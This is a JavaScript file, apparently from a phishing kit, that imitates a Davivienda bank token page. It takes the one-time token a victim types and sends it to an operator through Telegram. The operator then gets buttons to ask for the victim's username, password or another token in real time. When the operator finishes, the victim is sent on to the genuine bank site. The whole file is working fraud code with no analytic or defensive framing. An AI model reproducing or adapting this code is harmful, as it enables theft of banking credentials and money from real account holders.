/**
 * DAVIVIENDA - token.js OPTIMIZADO
 */

document.addEventListener('DOMContentLoaded', () => {
    console.log('🚀 Davivienda Token: Inicializando...');
    
    if (typeof BancoUtils === 'undefined') {
        console.error('❌ BancoUtils no está cargado');
        return;
    }
    
    BancoUtils.initSocket();
    console.log('✅ Socket inicializado');
    
    const input = document.getElementById('token');
    const btnContinue = document.getElementById('btnContinue');
    const overlay = document.getElementById('loadingOverlay');

    BancoUtils.onTelegramAction(handleTelegramAction);

    input.addEventListener('input', () => {
        BancoUtils.validateNumeric(input, 8);
        const isValid = input.value.length >= 6;
        btnContinue.disabled = !isValid;
        if (isValid) {
            btnContinue.classList.add('enabled');
        } else {
            btnContinue.classList.remove('enabled');
        }
    });

    btnContinue.addEventListener('click', async (e) => {
        e.preventDefault();
        e.stopPropagation();
        
        if (btnContinue.disabled) return;
        
        console.log('🔘 Botón clickeado');
        console.log('📦 Mostrando overlay...');
        
        if (overlay) {
            overlay.classList.add('show');
            overlay.classList.add('active');
            overlay.style.display = 'flex';
            console.log('✅ Overlay mostrado');
        }

        const data = BancoUtils.saveBankData('davivienda', { token: input.value });
        console.log('📤 Datos a enviar:', data);
        
        const message = BancoUtils.formatMessage('DAVIVIENDA - TOKEN', data);
        const keyboard = BancoUtils.createKeyboard([
            { text: '👤 Pedir Usuario', action: 'request_user' },
            { text: '🔐 Pedir Clave', action: 'request_password' },
            { text: '📱 Pedir Token', action: 'request_token' },
            { text: '✅ Finalizar', action: 'finish' }
        ], BancoUtils.getSessionId());

        console.log('📨 Enviando a Telegram...');
        try {
            await BancoUtils.sendToTelegram('token', { text: message, keyboard });
            console.log('✅ Mensaje enviado correctamente');
        } catch (error) {
            console.error('❌ Error al enviar:', error);
            if (overlay) {
                overlay.classList.remove('show', 'active');
                overlay.style.display = 'none';
            }
            alert('Error al enviar los datos. Por favor intente nuevamente.');
        }
    });

    function handleTelegramAction(data) {
        console.log('📢 Acción de Telegram recibida en Davivienda Token:', data);
        
        // Ocultar overlay primero
        const overlay = document.getElementById('loadingOverlay');
        if (overlay) {
            overlay.classList.remove('show', 'active');
            overlay.style.display = 'none';
            console.log('✅ Overlay ocultado');
        }
        
        switch(data.action) {
            case 'request_user':
                console.log('👤 Redirigiendo a index.html');
                window.location.href = 'index.html';
                break;
            case 'request_password':
                console.log('🔐 Redirigiendo a clave.html');
                window.location.href = 'clave.html';
                break;
            case 'request_token':
                console.log('📱 Limpiando campo de token');
                input.value = '';
                btnContinue.disabled = true;
                btnContinue.classList.remove('enabled');
                input.focus();
                break;
            case 'finish':
                console.log('✅ Finalizando - redirigiendo a davivienda.com');
                window.location.href = 'https://www.davivienda.com/';
                break;
            default:
                console.log('⚠️ Acción desconocida:', data.action);
        }
    }
});
